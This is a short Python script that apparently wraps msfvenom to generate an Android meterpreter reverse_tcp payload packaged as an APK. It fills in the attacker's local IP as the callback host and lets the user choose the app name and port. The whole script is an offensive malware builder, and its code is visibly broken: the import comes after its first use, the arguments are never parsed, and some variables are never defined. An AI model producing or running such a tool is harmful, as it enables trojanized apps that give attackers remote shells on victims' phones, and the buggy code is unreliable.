import socket
import argparse



def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    return s.getsockname()[0]

def launchProcess(command):
    p = Popen(command, stdout = PIPE, 
        stderr = STDOUT, shell = True)
    for line in p.stdout:
        print line.replace('\n', '')

from subprocess import Popen, PIPE, STDOUT

parser = argparse.ArgumentParser(description='Testing')
#parser.add_argument('ip_remota', metavar='ipr', type=str, nargs='+',
                    #help='ip remota')
parser.add_argument('app_name', metavar='name', type=str, nargs='+',
                    help='nombre de la app')
parser.add_argument('lp', metavar='lp', type=str, nargs='+',
                    help='local port')

ipl = get_ip_address()
com = "msfvenom -p android/meterpreter/reverse_tcp LHOST="+ipl+" LPORT="+lp+" R >"+app_name+".apk"

launchProcess(com)